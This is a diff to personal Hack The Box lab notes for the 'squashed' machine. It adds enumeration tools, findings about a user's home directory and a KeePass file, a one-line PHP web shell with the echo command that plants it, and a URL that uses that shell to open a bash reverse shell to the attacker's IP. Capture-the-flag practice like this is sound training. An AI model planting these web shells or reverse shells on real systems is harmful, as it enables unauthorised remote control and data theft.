@@ -14,6 +14,7 @@ export HTB_TARGET=10.10.11.191
 8. https://www.exploit-db.com/exploits/20025
 
 9. https://miloserdov.org/?p=4961#14
+10. https://github.com/epi052/feroxbuster
 
 ---
 ### Apps
@@ -21,7 +22,11 @@ export HTB_TARGET=10.10.11.191
 - rpcbind
 - nmap
 - nfs-common
+
 - hashcat
+- john-the-ripper
+- gobuster
+- feroxbuster
 (- grip -b <file>) // To visualize MD files from CLI
 
 ---
@@ -51,11 +56,24 @@ export HTB_TARGET=10.10.11.191
 <Get shared folders information | Using the mount command to map these folders>
 
 
+
 #####################################
 ---
 Collected info
-User: ross (id: 1001)
+/home/ross (gid: 1001 id: 1001)
 Get a kdbx file from /home/ross/Documents
+/var/www/html (gid: 2017 id:???)
+
+PHP Script to run commands received as parameters
+'<?php\n  system($_REQUEST['cmd']);\n?>'
+
+echo -e '<?php\n  system($_REQUEST['cmd']);\n?>' > htb.php
+##### PHP Reverse Shell
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+
+##### Reverse SHELL
+http://squashed.htb/htb.php?cmd=bash -c 'bash -i >& /dev/tcp/<my_ip>/443 0>&1'
 
 ---
 Next steps
